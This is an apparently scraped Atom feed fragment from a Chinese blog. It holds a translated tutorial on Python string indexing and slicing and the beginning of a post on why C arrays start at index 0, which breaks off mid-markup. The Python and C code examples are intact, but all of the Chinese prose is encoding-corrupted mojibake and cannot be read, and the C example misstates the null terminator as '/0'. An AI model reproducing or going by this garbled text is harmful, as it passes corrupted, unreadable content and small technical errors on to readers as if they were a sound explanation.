    <title>ç†è§£pythonç´¢å¼•å’Œåˆ‡ç‰‡</title>
    <link href="https://qiwihui.com/qiwihui-blog-15/"/>
    <id>https://qiwihui.com/qiwihui-blog-15/</id>
    <published>2018-10-09T05:30:14.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>è®¸å¤šåˆæ¬¡æ¥è§¦Pythonçš„äººå¯¹äºç´¢å¼•éƒ½ä¼šæœ‰åŒæ ·çš„ååº”ï¼šè¿™å¤ªå¥‡æ€ªäº†ã€‚åœ¨Pythonçš„åˆ—è¡¨ï¼Œå­—ç¬¦ä¸²å’Œæ¡ä»¶è¯­å¥ä¸­éƒ½å……æ–¥ç€ç´¢å¼•ï¼Œä½†åœ¨æˆ‘ä»¬ä¹ æƒ¯ä»–ä»¬ä¹‹å‰ï¼Œè¿™äº›éƒ½ä¼šæ˜¯æˆ‘ä»¬ç¨‹åºçš„é”™è¯¯æ¥æºã€‚å› æ­¤ï¼Œè®©æˆ‘ä»¬ç¡¬ç€å¤´çš®ä¸Šå§ï¼</p><span id="more"></span><p>è¿™ç‰‡æ–‡ç« ä¼šå†™å¾—å¾ˆæ…¢ï¼Œä¸ºäº†è§£é‡Šä¸€äº›åŸºç¡€å’Œé»˜è®¤çš„ä¸œè¥¿ã€‚</p><p>æˆ‘ä»¬ä¼šä½¿ç”¨å­—ç¬¦ä¸²åˆ‡ç‰‡ä¸¾ä¾‹ï¼Œå› ä¸ºè¿™äº‹æˆ‘ä»¬é¦–å…ˆæ¥è§¦çš„ï¼Œä¸è¿‡è¿™å¯¹äºåˆ—è¡¨åˆ‡ç‰‡å’Œè®¾å®šèŒƒå›´æ˜¯ä¸€æ ·çš„ã€‚æˆ‘ä»¬æœ‰ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;0123456789&#x27;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­ç¬¬kä¸ªä½ç½®çš„å­—ç¬¦ä¸ºkã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹æ–¹å¼å¯¹aè¿›è¡Œåˆ‡ç‰‡ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = a[start:stop:step]</span><br></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥åœ°ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;0123456789&#x27;</span>[start:stop:step]</span><br></pre></td></tr></table></figure><p>åœ¨Pythonä¸­ï¼Œå­—ç¬¦ä¸²å’ŒæŒ‡å‘å­—ç¬¦ä¸²çš„å˜é‡éƒ½æ˜¯å¯¹è±¡ï¼Œæ‰€ä»¥éƒ½å¯ä»¥è¿›è¡Œåˆ‡ç‰‡ï¼ˆäº‹å®ä¸Šï¼ŒPythonä¸­æ‰€æœ‰ä¸œè¥¿éƒ½æ˜¯å¯¹è±¡ï¼šæ•°å­—ï¼Œå˜é‡ï¼Œå­—ç¬¦ä¸²ï¼Œå‡½æ•°ï¼Œæ–‡ä»¶ï¼‰ã€‚</p><p>æœ‰ä¸‰ä»¶äº‹æƒ…éœ€è¦è®°ä½ï¼š</p><ol><li><code>start</code> æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç¬¬ä¸€é¡¹ï¼ˆå½“ç„¶ï¼‰</li><li><code>stop</code> æ˜¯æˆ‘ä»¬ç¬¬ä¸€ä¸ªä¸æƒ³è¦çš„é¡¹</li><li><code>step</code> å¯ä»¥æ˜¯æ­£æ•´æ•°ï¼Œä¹Ÿå¯ä»¥æ˜¯è´Ÿæ•°ï¼Œå®šä¹‰äº†å‘å‰ï¼ˆä»ç¬¬ä¸€ä¸ªä½ç½®åˆ°å‘æœ«å°¾ï¼‰è¿˜æ˜¯å‘åï¼ˆä»æœ€åä¸€ä¸ªä½ç½®å‘å¼€å§‹ä½ç½®ï¼‰ç´¢å¼•ã€‚</li></ol><p>ä¸€ä¸ªå°æé†’ï¼šä½†æˆ‘ä»¬å­¦ä¹ pythonä¹‹å¤–å…¶ä»–è¯­è¨€çš„æ—¶å€™ï¼Œstopçš„å®šä¹‰æ˜¯Pythonç´¢å¼•å’Œåˆ‡ç‰‡åœ¨ç†Ÿæ‚‰å…¶è¯­è¨€çš„ç¨‹åºå‘˜çœ‹æ¥å¦‚æ­¤å¥‡æ€ªçš„åŸå› ä¹‹ä¸€ã€‚åœ¨å¤§éƒ¨åˆ†è®¡ç®—æœºè¯­è¨€ä¸­ï¼Œstopåº”è¯¥æ˜¯â€œæˆ‘ä»¬éœ€è¦çš„æœ€åä¸€é¡¹â€ã€‚ä¸ç®¡è¿™ä¸ªå®šä¹‰æ˜¯å¦æ¯”å…¶ä»–è¯­è¨€æ›´å¥½æˆ–è€…æ›´åï¼ŒPythonçš„ç¡®æ˜¯ä¸å¯»å¸¸çš„ä¸€ç§è¯­è¨€ã€‚</p><p>åœ¨ç´¢å¼•ä¸­ä½¿ç”¨è´Ÿæ•°æ˜¯pythonå¦ä¸€ä¸ªå¥‡æ€ªçš„ç‰¹æ€§ã€‚åœ¨å¤§éƒ¨åˆ†Cè¡ç”Ÿçš„è¯­è¨€ï¼ˆC/C++/C#ï¼ŒJava,ï¼ŒJavascriptç­‰ï¼‰ä¸­ï¼Œè´Ÿæ•°ç´¢å¼•æ˜¯ä¸åˆæ³•çš„ï¼Œå› ä¸ºç´¢å¼•è¡¨ç¤ºä»å­—ç¬¦ä¸²åˆå§‹å†…å­˜åœ°å€çš„åç§»ï¼Œæ‰€ä»¥è´Ÿæ•°ç´¢å¼•ä¼šæŒ‡å‘å­—ç¬¦ä¸²å¼€å§‹ä½ç½®ä¹‹å‰çš„ä½ç½®ï¼ˆæ›´è¯¦ç»†çš„è¯·å‚è§è¿™ç¯‡åšå®¢ï¼š<a href="http://blog.daozhang.info/Why-does-indexing-begin-at-0/">ä¸ºä»€ä¹ˆpythonä¸­ç´¢å¼•ä»0å¼€å§‹</a>ï¼‰ã€‚ç„¶è€Œï¼ŒPythonå¹¶ä¸æ˜¯å”¯ä¸€ä½¿ç”¨è´Ÿæ•°ç´¢å¼•çš„è¯­è¨€ï¼Œæ¯”å¦‚ï¼Œ<a href="http://www.tutorialspoint.com/perl/perl_arrays.htm">Perl</a>åƒpythonä¸€æ ·ä½¿ç”¨è´Ÿæ•°ç´¢å¼•æ¥è¡¨ç¤ºä»å­—ç¬¦ä¸²æœ«å°¾å¼€å§‹çš„ä½ç½®ï¼›<a href="http://www.r-tutor.com/r-introduction/vector/vector-index">R</a>è¯­è¨€é¢å‘ç»Ÿè®¡ï¼ŒA[-i]è¡¨ç¤ºæ‰€æœ‰é™¤ç¬¬iä½ç½®çš„å€¼ã€‚ä¸è¿‡ï¼Œåªæœ‰å¾ˆå°‘çš„è¯­è¨€åœ¨ä»»æ„æƒ…å†µä¸‹ä½¿ç”¨è´Ÿæ•°ç´¢å¼•ã€‚</p><p>ç°åœ¨è®©æˆ‘ä»¬å›åˆ°Pythonç´¢å¼•ä¸Šã€‚</p><p>** ä½¿ç”¨æ­£æ•°å’Œè´Ÿæ•°ç´¢å¼• **</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ­£æ•´æ•°è¡¨ç¤ºå­—ç¬¦ä¸²ä¸­çš„ä½ç½®ï¼Œç”±å­—ç¬¦ä¸²å¼€å¤´ä»0å¼€å§‹è®¡æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = <span class="string">&quot;my mistress&#x27; eyes are nothing like the sun&quot;</span></span><br><span class="line">     ^         ^                              ^</span><br><span class="line">    b[<span class="number">0</span>]      b[<span class="number">10</span>]                          b[<span class="number">41</span>]</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç”¨len()å‡½æ•°æ¥è·å–ä¸€ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ã€‚å› æ­¤ï¼Œbæœ‰42ä¸ªå­—ç¬¦ï¼Œæ•…len(b)=42ã€‚å› ä¸ºbæœ€åä¸€ä¸ªå­—ç¬¦æ˜¯<code>b[41]</code>ï¼Œæ‰€ä»¥<code>len(b)</code>æ¯”bå­—ç¬¦ä¸²æœ€åä½ç½®ç´¢å¼•å¤š1ã€‚</p><p>æœ‰äº›æ—¶å€™è¿™å¯¹ä»å­—ç¬¦ä¸²æœ«å°¾å¼€å§‹æ‰¾å­—ç¬¦æ˜¯å¾ˆæœ‰å¸®åŠ©çš„ã€‚æ‰€ä»¥æˆ‘ä»¬ç”¨è´Ÿæ•°ï¼Œä»å­—ç¬¦ä¸²æœ«å°¾å¼€å§‹è®¡æ•°ï¼Œå³ä»-1ï¼ˆä¸æ˜¯0ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = <span class="string">&quot;my mistress&#x27; eyes are nothing like the sun&quot;</span></span><br><span class="line">     ^         ^                              ^</span><br><span class="line">   b[-<span class="number">42</span>]   b[-<span class="number">32</span>]                          b[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>ä»æœ«å°¾çœ‹çš„æœ€åä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯b[-42]ï¼Œé‚£ä¹ˆå®ƒå‰é¢çš„ä½ç½®ä¼šæ˜¯-len(b)-1 = -43ã€‚</p><p>æ‰€ä»¥ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­<code>len(b) = 42</code>ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b[<span class="number">0</span>]        = b[-<span class="built_in">len</span>(b)] = b[-<span class="number">42</span>] = <span class="string">&#x27;m&#x27;</span></span><br><span class="line">b[<span class="built_in">len</span>(b)-<span class="number">1</span>] = b[-<span class="number">1</span>]      = b[<span class="number">41</span>]  = <span class="string">&#x27;n&#x27;</span></span><br><span class="line">b[<span class="number">10</span>]       = b[-<span class="number">32</span>]              = <span class="string">&#x27;s&#x27;</span></span><br></pre></td></tr></table></figure><p>å¹¶ä¸”ä¸€èˆ¬åœ°ï¼Œ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b[k]        = b[-<span class="built_in">len</span>(b)+k]</span><br></pre></td></tr></table></figure><p>hmm, è¿™å¾ˆä»¤äººç–‘æƒ‘ã€‚æˆ‘ä»¬éœ€è¦äº†è§£ç´¢å¼•çš„ä¸€èˆ¬æœºåˆ¶ï¼Œä½†æ˜¯ï¼Œæˆ‘ä»¬ä¸éœ€è¦è®°ä½è¿™äº›è¾¹ç•Œå€¼ï¼Œè¿™äº›æ˜¯pythonä¸­é»˜è®¤çš„ã€‚</p><p>é»˜è®¤å€¼æ˜¯å¼•ç”¨ä¸€ä¸ªå˜é‡çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ²¡æœ‰æŒ‡å®šæ˜ç¡®çš„å€¼ã€‚è¿™å°±å’Œæˆ‘ä»¬â€œé»˜è®¤åœ°â€ç§°å‘¼ä¸€ä½å¥³æ€§ä¸ºå¥³å£«(<a href="http://en.wikipedia.org/wiki/Ms.">Ms.</a>)ä¸€æ ·ã€‚å¦‚æœæˆ‘ä»¬æ²¡æœ‰è¢«å‘ŠçŸ¥éœ€è¦ç§°å‘¼å¥¹ä¸ºå¤ªå¤ªï¼ˆMrs.ï¼‰æˆ–è€…å°å§(Missï¼‰ï¼Œæˆ–è€…å¦‚æœæˆ‘ä»¬å¿½ç•¥äº†å®é™…çš„å°Šç§°ï¼Œæˆ‘ä»¬é™é€€å›åˆ°â€œé»˜è®¤â€å€¼ã€‚Pythonå¯¹äºå¾ˆå¸¸ç”¨çš„<code>start</code>, <code>stop</code> and <code>step</code>éƒ½æœ‰é»˜è®¤å€¼ã€‚</p><p>** å¦‚æœ<code>step</code>æ˜¯æ­£æ•°ï¼Œæˆ‘ä»¬å‘å‰ç§»åŠ¨ï¼ˆå¦‚æœ<code>step</code>å€¼ä¸ºç©ºï¼Œåˆ™é»˜è®¤ä¸º+1ï¼‰**</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a[<span class="number">2</span>:<span class="number">6</span>] = <span class="string">&#x27;0123456789&#x27;</span>[<span class="number">2</span>:<span class="number">6</span>:<span class="number">1</span>] = <span class="string">&#x27;2345&#x27;</span></span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šä¾‹ï¼Œæˆ‘ä»¬æƒ³è¦çš„ç¬¬ä¸€ä¸ªå€¼åœ¨ç¬¬äºŒä¸ªä½ç½®ï¼Œç¬¬ä¸€ä¸ªä¸æƒ³è¦çš„åœ¨ç¬¬6ä¸ªä½ç½®ã€‚</p><p>æ›´è¿›ä¸€æ­¥ï¼Œæˆ‘ä»¬ä»å­—ç¬¦ä¸²æœ«å°¾å¼€å§‹çœ‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a[-<span class="number">8</span>:-<span class="number">4</span>] = <span class="string">&#x27;0123456789&#x27;</span>[-<span class="number">8</span>:-<span class="number">4</span>:<span class="number">1</span>] = <span class="string">&#x27;2345&#x27;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æƒ³è¦çš„ç¬¬ä¸€ä¸ªå€¼æ˜¯ä»åæ•°ç¬¬8ä¸ªï¼ˆ2ï¼‰ï¼Œç¬¬ä¸€ä¸ªä¸æƒ³è¦çš„æ˜¯ä»åæ•°ç¬¬4ä¸ªï¼ˆ6ï¼‰ã€‚</p><p>æ‰€ä»¥ï¼Œå¯¹äºä»»æ„æ­£æ•°<code>step</code>ï¼Œæˆ‘ä»¬æœ‰å¦‚ä¸‹çš„é»˜è®¤å€¼ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">     |-&gt; -&gt; -&gt;|</span><br><span class="line">a = <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">     ^         ^</span><br><span class="line">  start:<span class="number">0</span>   stop: <span class="built_in">len</span>(a), i.e, è¶…å‡ºäº†å­—ç¬¦ä¸²çš„æœ«å°¾çš„ä½ç½®</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a[:]    = a[<span class="number">0</span>:<span class="built_in">len</span>(a):<span class="number">1</span>] = <span class="string">&#x27;0123456789&#x27;</span> <span class="comment"># a +1 step é»˜è®¤</span></span><br><span class="line">a[::<span class="number">2</span>]  = a[<span class="number">0</span>:<span class="built_in">len</span>(a):<span class="number">2</span>] = <span class="string">&#x27;02468&#x27;</span>      <span class="comment"># æ‰€æœ‰å¶æ•°ä½ç½®</span></span><br><span class="line">a[<span class="number">1</span>::<span class="number">2</span>] = <span class="string">&#x27;13579&#x27;</span>                      <span class="comment"># æ‰€æœ‰å¥‡æ•°ä½ç½®</span></span><br><span class="line">a[::<span class="number">3</span>]  = <span class="string">&#x27;0369&#x27;</span>                       <span class="comment"># æ‰€æœ‰3çš„å€æ•°ä½ç½®</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œåªè¦æˆ‘ä»¬ä»å­—ç¬¦ä¸²å¤´éƒ¨æˆ–è€…å°¾éƒ¨ä½¿ç”¨åˆ‡ç‰‡ï¼ŒPythonéƒ½ä¼šä½¿ç”¨é»˜è®¤å€¼ã€‚</p><p>** å¦‚æœ<code>step</code>æ˜¯è´Ÿæ•°ï¼Œè€Œæˆ‘ä»¬ä»åå¾€å‰æ•°**</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a[<span class="number">6</span>:<span class="number">2</span>:-<span class="number">1</span>] = <span class="string">&#x27;0123456789&#x27;</span>[<span class="number">6</span>:<span class="number">2</span>:-<span class="number">1</span>] = <span class="string">&#x27;6543&#x27;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦çš„ç¬¬ä¸€ä¸ªå€¼åœ¨ç¬¬å…­ä¸ªä½ç½®ï¼Œä¸éœ€è¦çš„ç¬¬ä¸€ä¸ªå€¼åœ¨ç¬¬äºŒä¸ªä½ç½®ã€‚</p><p>æˆ–è€…è¿›ä¸€æ­¥ï¼Œ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a[-<span class="number">4</span>:-<span class="number">8</span>:-<span class="number">1</span>] = <span class="string">&#x27;0123456789&#x27;</span>[-<span class="number">4</span>:-<span class="number">8</span>:-<span class="number">1</span>] = <span class="string">&#x27;6543&#x27;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æƒ³è¦çš„ç¬¬ä¸€ä¸ªå€¼æ˜¯ä»åæ•°ç¬¬4ä¸ªï¼ˆ6ï¼‰ï¼Œç¬¬ä¸€ä¸ªä¸æƒ³è¦çš„æ˜¯ä»åæ•°ç¬¬8ä¸ªï¼ˆ2ï¼‰ã€‚</p><p>æ³¨æ„åˆ°æˆ‘ä»¬å¯ä»¥åœ¨ç´¢å¼•ä¸­ä½¿ç”¨æ­£æ•°æˆ–è€…è´Ÿæ•°ï¼Œä»¥åŠä»å‰æˆ–è€…ä»åæœå¯»å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”šè‡³å¯ä»¥å°†å®ƒä»¬æ··åˆèµ·æ¥ä½¿ç”¨ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a[<span class="number">6</span>:-<span class="number">8</span>:-<span class="number">1</span>] = <span class="string">&#x27;6543&#x27;</span></span><br><span class="line">a[-<span class="number">4</span>:<span class="number">2</span>:-<span class="number">1</span>] = <span class="string">&#x27;6543&#x27;</span></span><br></pre></td></tr></table></figure><p>æœ‰æ—¶å€™è¿™æ ·çš„æ··åˆå¼éå¸¸æ–¹ä¾¿çš„ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&#x27;&lt;a href=&quot;http://udacity.com&quot;&gt;&#x27;</span>[<span class="number">9</span>:-<span class="number">2</span>]</span><br><span class="line">    = <span class="string">&#x27;http://udacity.com&#x27;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦è®°ä½çš„æ˜¯ä½¿ç”¨è´Ÿæ•°ç´¢å¼•ä¸æ„å‘³ç€æˆ‘ä»¬å°±æ˜¯å‘åç§»åŠ¨ï¼Œåªæ˜¯æˆ‘ä»¬ä»å­—ç¬¦ä¸²æœ«å°¾å¼€å§‹ç´¢å¼•ã€‚å‘å‰è¿˜æ˜¯å‘åæ˜¯ä»…ç”±stepå˜é‡çš„ç¬¦å·å†³å®šçš„ã€‚</p><p>ä¸ºäº†å‘åç§»åŠ¨ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æˆ‘ä»¬çš„æ„è¯†ä¸­åè½¬è¿™ä¸ªå­—ç¬¦ä¸²ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">     |&lt;- &lt;- &lt;-|</span><br><span class="line">a = <span class="string">&#x27;0123456789&#x27;</span></span><br><span class="line">    ^         ^</span><br><span class="line">    ^      start:-<span class="number">1</span></span><br><span class="line">stop:åœ¨å­—ç¬¦ä¸²å¼€å§‹ä½ç½®ä¹‹å‰çš„ä½ç½®</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a[::-<span class="number">1</span>] = a[-<span class="number">1</span>::-<span class="number">1</span>] = <span class="string">&#x27;9876543210&#x27;</span> <span class="comment"># æˆ‘ä»¬åªæ˜¯å­¦ä¹ å¦‚ä½•åè½¬å­—ç¬¦ä¸²</span></span><br><span class="line">a[::-<span class="number">2</span>] = a[-<span class="number">1</span>:-<span class="built_in">len</span>(a)-<span class="number">1</span>:-<span class="number">2</span>] = <span class="string">&#x27;97531&#x27;</span></span><br><span class="line">a[::-<span class="number">3</span>] = a[-<span class="number">1</span>:-<span class="built_in">len</span>(a)-<span class="number">1</span>:-<span class="number">3</span>] = <span class="string">&#x27;9630&#x27;</span></span><br></pre></td></tr></table></figure><p>å†ä¸€æ¬¡ï¼Œåªè¦æˆ‘ä»¬ä»å­—ç¬¦ä¸²çš„å¤´éƒ¨æˆ–è€…å°¾éƒ¨å¯¹å­—ç¬¦ä¸²åˆ‡ç‰‡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç©ºçš„startå’Œstopå˜é‡ï¼ŒPythonä¼šä½¿ç”¨é»˜è®¤å€¼ã€‚</p><p>åªç”¨6ä¸ªå­—ç¬¦å°±åè½¬äº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå‰å®³å§ï¼å¯æƒœçš„æ˜¯è¿™ä¸ªåªåœ¨Pythonä¸­æœ‰ç”¨ï¼Œè®¸å¤šå…¶ä»–çš„è¯­è¨€å¹¶ä¸æ”¯æŒè¿™ç§æ–¹å¼ã€‚è¿™ç±»é—®é¢˜åªæ˜¯ç”¨æ¥æ˜¯æˆ‘ä»¬ç†Ÿæ‚‰è¿™ç§ç»“æ„ï¼Œä¸åªæ˜¯åœ¨Pythonä¸­ï¼Œä¹ŸåŒ…æ‹¬å…¶ä»–è¯­è¨€åœ¨å†…ã€‚å› æ­¤ï¼Œè€ƒè™‘éœ€è¦åè½¬å­—ç¬¦ä¸²çš„è¿™ç±»é—®é¢˜ï¼ˆæ¯”å¦‚å›æ–‡é—®é¢˜ï¼‰å¯ä»¥è®©æˆ‘ä»¬å­¦ä¹ å¦‚ä½•ä½¿ç”¨å¾ªç¯ï¼Œç´¢å¼•ï¼Œå¹¶ä¸”å°è¯•ä¸åŒåˆ‡ç‰‡æ¥è§£å†³è¿™äº›é—®é¢˜ã€‚è¿™æ ·ï¼Œä½ å°±æœ‰ä¸¤æ‰‹å‡†å¤‡äº†ã€‚</p><hr><p>æ‰€ä»¥ç°åœ¨ï¼Œæˆ‘ä»¬å·²ç»æŒæ¡äº†Pythonçš„ç´¢å¼•ï¼Œåº”è¯¥èƒ½æ˜ç™½åº•ä¸‹è¿™äº›äº†ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;0123456789&#x27;</span>[<span class="number">8</span>:<span class="number">2</span>:-<span class="number">2</span>]   = <span class="string">&#x27;864&#x27;</span></span><br><span class="line"><span class="string">&#x27;0123456789&#x27;</span>[<span class="number">8</span>:-<span class="number">8</span>:-<span class="number">2</span>]  = <span class="string">&#x27;864&#x27;</span></span><br><span class="line"><span class="string">&#x27;0123456789&#x27;</span>[-<span class="number">2</span>:<span class="number">2</span>:-<span class="number">2</span>]  = <span class="string">&#x27;864&#x27;</span></span><br><span class="line"><span class="string">&#x27;0123456789&#x27;</span>[-<span class="number">2</span>:-<span class="number">8</span>:-<span class="number">2</span>] = <span class="string">&#x27;864&#x27;</span></span><br></pre></td></tr></table></figure><p>Good luck!</p><p>åŸæ–‡åœ¨<a href="http://forums.udacity.com/questions/2017002/python-101-unit-1-understanding-indices-and-slicing">è¿™å„¿</a></p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ç†è§£pythonç´¢å¼•å’Œåˆ‡ç‰‡
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>ä¸ºä»€ä¹ˆpythonä¸­ç´¢å¼•ä»0å¼€å§‹</title>
    <link href="https://qiwihui.com/qiwihui-blog-14/"/>
    <id>https://qiwihui.com/qiwihui-blog-14/</id>
    <published>2018-10-09T05:29:28.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨Pythonä¸­å­—ç¬¦ä¸²ç´¢å¼•ä»0å¼€å§‹è€Œä¸æ˜¯ä»1å¼€å§‹æ˜¯åˆä¹é€»è¾‘çš„é€‰æ‹©ï¼Œå› ä¸ºpythonæ˜¯ç”¨Cè¯­è¨€å†™çš„ï¼Œåšä¸ºCçš„ä¸»è¦æ•°æ®ç»“æ„ï¼Œæ•°ç»„æ˜¯ä»0å¼€å§‹ç´¢å¼•çš„ã€‚è¿™åœ¨Cä¸­æ˜¯å¾ˆåŸºç¡€çš„ï¼Œä»¥è‡³äºå¦‚æœæ”¹å˜ç´¢å¼•ä»1å¼€å§‹å°†ä¼šéœ€è¦å¤§é‡çš„å·¥ä½œã€‚</p><span id="more"></span><p>** 1) é‚£ä¹ˆä¸‹ä¸€ä¸ªé—®é¢˜ï¼šä¸ºä»€ä¹ˆåœ¨Cä¸­ç´¢å¼•ä»0å¼€å§‹ï¼Ÿ**</p><p>Cè¯­è¨€ä¸­çš„ä¸»è¦æ•°æ®ç»“æ„æ˜¯æ•°ç»„ï¼Œæ•°ç»„æ—¶ä¸€äº›ç›¸åŒç±»å‹å…ƒç´ çš„é›†åˆã€‚åœ¨Cä¸­ï¼Œå­—ç¬¦ä¸²æ—¶å­—ç¬¦æ•°ç»„ï¼Œå¦‚æœä½ æƒ³å­˜å‚¨å­—ç¬¦ä¸²â€œHELLOâ€ï¼ŒCä¼šåœ¨å†…å­˜ä¸­å¯»æ‰¾ä¸€å—è¿ç»­çš„åœ°æ–¹å­˜å‚¨è¿™äº›å­—ç¬¦ã€‚æ¯”å¦‚ï¼Œä»å†…å­˜åœ°å€7000å¼€å§‹å­˜å‚¨ï¼Œé‚£ä¹ˆè¿™ä¸ªå­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­çš„åœ°å€å°±æ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">7000</span> <span class="string">&#x27;H&#x27;</span></span><br><span class="line"><span class="number">7001</span> <span class="string">&#x27;E&#x27;</span></span><br><span class="line"><span class="number">7002</span> <span class="string">&#x27;L&#x27;</span></span><br><span class="line"><span class="number">7003</span> <span class="string">&#x27;L&#x27;</span></span><br><span class="line"><span class="number">7004</span> <span class="string">&#x27;O&#x27;</span></span><br><span class="line"><span class="number">7005</span> <span class="string">&#x27;/0&#x27;</span></span><br></pre></td></tr></table></figure><p>ä½ å¯èƒ½ä¼šé—®ï¼šæœ€åä¸€ä¸ªâ€™/0â€™æ˜¯ä»€ä¹ˆï¼Ÿè¿™ä¸ªä¸æ˜¯å­—ç¬¦ä¸²&quot;HELLO&quot;çš„ä¸€éƒ¨åˆ†ã€‚è¿™ä¸ªç§°ä½œç©ºå€¼ç»ˆæ­¢å­—ç¬¦ä¸²ã€‚æˆ‘ä»¬çŸ¥é“å­—ç¬¦ä¸²ä»7000å¼€å§‹ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“åœ¨å“ªé‡Œç»“æŸï¼Œå› æ­¤Cåœ¨å­—ç¬¦ä¸²çš„æœ«å°¾åŠ äº†ä¸€ä¸ªç©ºå€¼ä½¿å¾—æˆ‘ä»¬éå†å­—ç¬¦ä¸²æ—¶çŸ¥é“å®ƒåœ¨å“ªé‡Œç»“æŸã€‚è®©æˆ‘ä»¬å†å›åˆ°åŸæ¥çš„é—®é¢˜ã€‚</p><p>è®©æˆ‘ä»¬è®¤çœŸçœ‹ä¸€ä¸‹è¿™äº›å­—ç¬¦çš„åœ°å€ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦è¿™ä¸ªå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯å¾—åˆ°è¿™ä¸ªå­—ç¬¦ä¸²çš„åˆå§‹å†…å­˜åœ°å€ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;H&#x27;</span> åœ°å€åœ¨ <span class="number">7000</span> å› ä¸ºå­—ç¬¦ä¸²ä» <span class="number">7000</span> å¼€å§‹</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬è¦å­—ç¬¦â€™Eâ€™ï¼Œåªéœ€è¦åœ°å€åç§»åŠ 1:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;E&#x27;</span> is at <span class="number">7000</span>+<span class="number">1</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥æ˜¯ç”¨åç§»æ¥å¾—åˆ°æ‰€ä»¥çš„å­—ç¬¦ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;H&#x27;</span> is at <span class="number">7000</span> + <span class="number">0</span></span><br><span class="line"><span class="string">&#x27;E&#x27;</span> is at <span class="number">7000</span> + <span class="number">1</span></span><br><span class="line"><span class="string">&#x27;L&#x27;</span> is at <span class="number">7000</span> + <span class="number">2</span></span><br><span class="line"><span class="string">&#x27;L&#x27;</span> is at <span class="number">7000</span> + <span class="number">3</span></span><br><span class="line"><span class="string">&#x27;O&#x27;</span> is at <span class="number">7000</span> + <span class="number">4</span></span><br></pre></td></tr></table></figure><p>å•Šå“ˆï¼çœ‹åˆ°äº†å—ï¼Ÿæˆ‘ä»¬å¾ˆè‡ªç„¶åœ°ä¼šä½¿å¾—ç´¢å¼•ç­‰äºä¾¿å®œï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ‰¾åˆ°æ•°ç»„ä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚å¦‚æœæˆ‘ä»¬èµ‹å€¼å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">greeting = <span class="string">&#x27;HELLO&#x27;</span></span><br></pre></td></tr></table></figure><p>åˆ™</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">greeting[<span class="number">0</span>] = <span class="string">&#x27;H&#x27;</span></span><br><span 